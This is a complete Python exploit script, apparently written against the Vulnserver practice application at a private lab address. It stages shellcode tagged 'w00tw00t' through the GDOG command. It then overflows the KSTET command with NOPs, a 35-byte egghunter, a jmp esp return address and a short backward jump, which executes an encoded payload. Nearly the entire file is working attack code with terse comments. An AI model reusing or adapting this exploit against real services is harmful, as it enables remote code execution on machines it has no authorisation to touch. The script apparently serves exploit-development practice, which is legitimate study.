import socket


byte_size = 68

#Search w00tw00t string
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc8\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

#Shellcode
buf =  b""
buf += b"\xbb\x2d\xd3\xd6\xa8\xda\xd2\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x5f\x12\x83\xc7\x04\x03\x72\xdd\x34"
buf += b"\x5d\x70\x09\x3a\x9e\x88\xca\x5b\x16\x6d\xfb\x5b\x4c"
buf += b"\xe6\xac\x6b\x06\xaa\x40\x07\x4a\x5e\xd2\x65\x43\x51"
buf += b"\x53\xc3\xb5\x5c\x64\x78\x85\xff\xe6\x83\xda\xdf\xd7"
buf += b"\x4b\x2f\x1e\x1f\xb1\xc2\x72\xc8\xbd\x71\x62\x7d\x8b"
buf += b"\x49\x09\xcd\x1d\xca\xee\x86\x1c\xfb\xa1\x9d\x46\xdb"
buf += b"\x40\x71\xf3\x52\x5a\x96\x3e\x2c\xd1\x6c\xb4\xaf\x33"
buf += b"\xbd\x35\x03\x7a\x71\xc4\x5d\xbb\xb6\x37\x28\xb5\xc4"
buf += b"\xca\x2b\x02\xb6\x10\xb9\x90\x10\xd2\x19\x7c\xa0\x37"
buf += b"\xff\xf7\xae\xfc\x8b\x5f\xb3\x03\x5f\xd4\xcf\x88\x5e"
buf += b"\x3a\x46\xca\x44\x9e\x02\x88\xe5\x87\xee\x7f\x19\xd7"
buf += b"\x50\xdf\xbf\x9c\x7d\x34\xb2\xff\xe9\xf9\xff\xff\xe9"
buf += b"\x95\x88\x8c\xdb\x3a\x23\x1a\x50\xb2\xed\xdd\x97\xe9"
buf += b"\x4a\x71\x66\x12\xab\x58\xad\x46\xfb\xf2\x04\xe7\x90"
buf += b"\x02\xa8\x32\x36\x52\x06\xed\xf7\x02\xe6\x5d\x90\x48"
buf += b"\xe9\x82\x80\x73\x23\xab\x2b\x8e\xa4\x14\x03\x91\x25"
buf += b"\xfd\x56\x91\x40\xc4\xdf\x77\x20\x26\xb6\x20\xdd\xdf"
buf += b"\x93\xba\x7c\x1f\x0e\xc7\xbf\xab\xbd\x38\x71\x5c\xcb"
buf += b"\x2a\xe6\xac\x86\x10\xa1\xb3\x3c\x3c\x2d\x21\xdb\xbc"
buf += b"\x38\x5a\x74\xeb\x6d\xac\x8d\x79\x80\x97\x27\x9f\x59"
buf += b"\x41\x0f\x1b\x86\xb2\x8e\xa2\x4b\x8e\xb4\xb4\x95\x0f"
buf += b"\xf1\xe0\x49\x46\xaf\x5e\x2c\x30\x01\x08\xe6\xef\xcb"
buf += b"\xdc\x7f\xdc\xcb\x9a\x7f\x09\xba\x42\x31\xe4\xfb\x7d"
buf += b"\xfe\x60\x0c\x06\xe2\x10\xf3\xdd\xa6\x21\xbe\x7f\x8e"
buf += b"\xa9\x67\xea\x92\xb7\x97\xc1\xd1\xc1\x1b\xe3\xa9\x35"
buf += b"\x03\x86\xac\x72\x83\x7b\xdd\xeb\x66\x7b\x72\x0b\xa3"

## all are nops instead of "A".
buffer = (b"\x90"*30) 

## Egg hunter is also part our buffer. Later, We will do a short jump here
buffer += egghunter 

## Rest of the buffer for successful overflow(in total it is 68)
buffer += b"\x90"*(68-len(egghunter)-30) 

###625011af, this is the jmp esp address
eip = b"\xaf\x11\x50\x62"

###I am prepending the w00tw00t before shellcode start. egg code will search this string,come here and execute our shellcode
shellcode = b"w00tw00t"+buf 


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.21',9990))

### First we send our shellcode without crashing the application
s.send((b"GDOG "+shellcode))
s.close()

vulCommand = b"KSTET \r\n" ### Second Command

#Okay, Jump back to 60 bytes where the egg code exist.
buff = buffer+eip+b"\xeb\xc2" 		

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.21',9990))

s.send((vulCommand+buff+b"\x90"*200)) 

print(s.recv(1024))
s.close()
